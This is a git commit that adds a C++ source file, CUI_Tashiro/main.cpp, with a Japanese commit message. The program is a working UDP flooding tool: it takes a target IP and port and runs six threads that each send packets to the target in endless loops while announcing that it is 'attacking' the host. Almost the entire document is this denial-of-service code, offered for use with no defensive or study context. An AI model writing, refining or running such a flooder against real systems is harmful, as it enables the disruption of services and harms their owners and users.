a62e5d48880cb7afe2782e11824d67b1136198ab
ware255 <koichi1919@outlook.jp>
2021-12-12 18:24:15 +0900

    プロジェクト ファイルを追加します。

---
+++ CUI_Tashiro/main.cpp
@@ -0,0 +1,143 @@
+﻿#include<cstdio>
+#include<cstdlib>
+#include<cstring>
+#include<netdb.h>
+#include<netinet/in.h>
+#include<sys/socket.h>
+#include<arpa/inet.h>
+
+#include <sys/types.h>
+#include <unistd.h>
+
+#include <thread>
+
+const char data[] = "GET / HTTP/1.0\r\n\r\n";
+
+void attack(char* str, int port)
+{
+    int soc;
+    struct sockaddr_in addr;
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr(str);
+    addr.sin_port = htons(port);
+
+    int(*F_sock)(int, int, int) = socket;
+    int(*F_close)(int) = close;
+
+    while (true) {
+        try {
+            //ソケット生成
+            soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+
+            //データ送信
+            sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+
+            //ソケットを閉じる
+            (*F_close)(soc);
+        }
+        catch (...) {
+            perror("Error ");
+            exit(-1);
+        }
+    }
+}
+
+void attack2(char* str, int port)
+{
+    int sock;
+    struct sockaddr_in addr;
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr(str);
+    addr.sin_port = htons(port);
+
+    int(*F_sock)(int, int, int) = socket;
+    int(*F_close)(int) = close;
+
+    while (true) {
+        try {
+            //ソケット生成
+            sock = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+
+            //データ送信
+            sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+
+            //ソケットを閉じる
+            (*F_close)(sock);
+        }
+        catch (...) {
+            perror("Error ");
+            exit(-1);
+        }
+    }
+}
+
+void attack3(char* str, int port)
+{
+    int socks;
+    struct sockaddr_in addr;
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr(str);
+    addr.sin_port = htons(port);
+
+    int(*F_sock)(int, int, int) = socket;
+    int(*F_close)(int) = close;
+
+    while (true) {
+        try {
+            //ソケット生成
+            socks = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+
+            //データ送信
+            sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+
+            //ソケットを閉じる
+            (*F_close)(socks);
+        }
+        catch (...) {
+            perror("Error ");
+            exit(-1);
+        }
+    }
+}
+
+int main(int argc, char* argv[])
+{
+    struct hostent* he;
+    char* str = nullptr;
+    int port;
+
+    if (argc < 3) {
+        printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
+        return -1;
+    }
+
+    if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
+        perror("Error ");
+        return -1;
+    }
+
+    port = atoi(argv[2]);
+
+    str = he->h_name;
+
+    printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);
+
+    std::thread t1(attack, str, port);
+    std::thread t2(attack, str, port);
+    std::thread t3(attack2, str, port);
+    std::thread t4(attack2, str, port);
+    std::thread t5(attack3, str, port);
+    std::thread t6(attack3, str, port);
+
+    t1.join();
+    t2.join();
+    t3.join();
+    t4.join();
+    t5.join();
+    t6.join();
+
+    return 0;
+}
